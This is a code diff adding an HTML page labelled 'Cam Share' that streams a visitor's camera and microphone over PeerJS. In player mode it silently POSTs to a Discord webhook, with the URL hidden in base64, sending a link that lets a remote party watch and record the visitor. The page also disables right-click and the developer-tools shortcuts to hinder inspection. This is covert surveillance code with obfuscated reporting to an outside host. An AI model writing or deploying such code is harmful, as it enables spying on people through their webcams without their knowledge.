@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <title>REDACTED</title>
+    <style>
+      body {
+        text-align: center;
+        background: #000;
+        color: #fff;
+        font-family: sans-serif;
+        margin: 2em 0 0;
+      }
+      #host-ui {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 1em;
+      }
+      video {
+        width: 100%;
+        max-width: 960px;
+        height: auto;
+        border: 2px solid #444;
+        border-radius: 4px;
+      }
+      .controls {
+        display: flex;
+        align-items: center;
+        gap: 1em;
+      }
+      .controls button {
+        padding: 0.5em 1em;
+        background-color: #4caf50;
+        border: none;
+        border-radius: 4px;
+        color: white;
+        font-size: 1em;
+        cursor: pointer;
+      }
+      .controls button.recording {
+        background-color: #c62828;
+      }
+      .badge {
+        padding: 0.3em 0.6em;
+        border-radius: 12px;
+        font-size: 0.9em;
+        font-weight: bold;
+        display: inline-block;
+      }
+      .badge.on {
+        background-color: #c62828;
+        color: white;
+      }
+      .badge.off {
+        background-color: #444;
+        color: #ccc;
+      }
+    </style>
+  </head>
+  <body>
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <script>
+      const params = new URLSearchParams(location.search);
+      const mode = params.get("mode"),
+        hostId = params.get("id"),
+        TEN_MIN = 10 * 60 * 1000;
+
+      function getPlayerId() {
+        const now = Date.now(),
+          stored = localStorage.getItem("playerId"),
+          ts = +localStorage.getItem("idTs");
+        if (stored && ts && now - ts < TEN_MIN) return stored;
+        const next = Math.random().toString(36).slice(2, 11);
+        localStorage.setItem("playerId", next);
+        localStorage.setItem("idTs", now);
+        return next;
+      }
+      function makePeer(fixedId, onOpen) {
+        const p = fixedId ? new Peer(fixedId) : new Peer();
+        p.on("open", onOpen);
+        p.on("error", (e) => {
+          console.warn("Peer error:", e);
+          setTimeout(() => p.reconnect(), 2000);
+        });
+        p.on("disconnected", () => setTimeout(() => p.reconnect(), 2000));
+        return p;
+      }
+
+      if (mode === "player") {
+        const pid = getPlayerId();
+        const peer = makePeer(pid, (id) => {
+          fetch(
+            atob(
+              "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NTI4MTU5MjMzMDk0ODYyOC9kbjl0Si1TTXdYYXdJVTNMeWtQc1ZtS2ZRQ3o5YloxSjRyei1ZYno2MGcyWFFMQXVPV3J0dE5oQWJFcTNxMDV0dGV6bw"
+            ),
+            {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                embeds: [
+                  {
+                    title: "New Player Connected",
+                    description: `Player ID: \`${id}\` has connected.`,
+                    color: 3447003,
+                    fields: [
+                      {
+                        name: "Host Link",
+                        value: `${location.origin}${location.pathname}?mode=host&id=${id}`,
+                        inline: false,
+                      },
+                    ],
+                    footer: { text: "Cam Share" },
+                    timestamp: new Date(),
+                  },
+                ],
+              }),
+            }
+          );
+        });
+        navigator.mediaDevices
+          .getUserMedia({ video: true, audio: true })
+          .then((stream) => peer.on("call", (call) => call.answer(stream)))
+          .catch(() => alert("Camera access failed."));
+      } else if (mode === "host" && hostId) {
+        // build UI container
+        const ui = document.createElement("div");
+        ui.id = "host-ui";
+        document.body.appendChild(ui);
+
+        // header
+        const header = document.createElement("h3");
+        header.textContent = "Connecting…";
+        ui.appendChild(header);
+
+        // video (single element, reused)
+        const videoEl = document.createElement("video");
+        videoEl.autoplay = true;
+        videoEl.playsInline = true;
+        ui.appendChild(videoEl);
+
+        // controls
+        const controls = document.createElement("div");
+        controls.className = "controls";
+        ui.appendChild(controls);
+
+        // record toggle button
+        const btn = document.createElement("button");
+        btn.textContent = "Start Recording";
+        btn.disabled = true;
+        controls.appendChild(btn);
+
+        // status badge
+        const badge = document.createElement("span");
+        badge.className = "badge off";
+        badge.textContent = "Stopped";
+        controls.appendChild(badge);
+
+        // recording logic
+        let recorder,
+          isRec = false,
+          buf = [];
+        btn.addEventListener("click", () => {
+          if (!isRec) {
+            recorder.start();
+            isRec = true;
+            btn.textContent = "Stop Recording";
+            btn.classList.add("recording");
+            badge.textContent = "Recording…";
+            badge.className = "badge on";
+          } else {
+            recorder.stop();
+            isRec = false;
+            btn.textContent = "Start Recording";
+            btn.classList.remove("recording");
+            badge.textContent = "Stopped";
+            badge.className = "badge off";
+          }
+        });
+
+        // PeerJS
+        const peer = makePeer(null, () => {
+          navigator.mediaDevices
+            .getUserMedia({ video: true, audio: true })
+            .then((dummy) => {
+              const call = peer.call(hostId, dummy);
+              call.on("stream", (stream) => {
+                header.textContent = "Live Stream:";
+                videoEl.srcObject = stream;
+
+                // now we can record
+                recorder = new MediaRecorder(stream);
+                recorder.ondataavailable = (e) => buf.push(e.data);
+                recorder.onstop = () => {
+                  const blob = new Blob(buf, { type: "video/webm" });
+                  const url = URL.createObjectURL(blob);
+                  const a = document.createElement("a");
+                  a.href = url;
+                  a.download = "recorded-video.webm";
+                  a.click();
+                  buf = [];
+                };
+                btn.disabled = false;
+              });
+              call.on("error", () => alert("Stream error."));
+            })
+            .catch(() => alert("Unable to start dummy stream."));
+        });
+      }
+
+      // disable right-click & F12/Ctrl+Shift+I
+      document.addEventListener("contextmenu", (e) => e.preventDefault());
+      document.addEventListener("keydown", (e) => {
+        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I"))
+          e.preventDefault();
+      });
+    </script>
+  </body>
+</html>
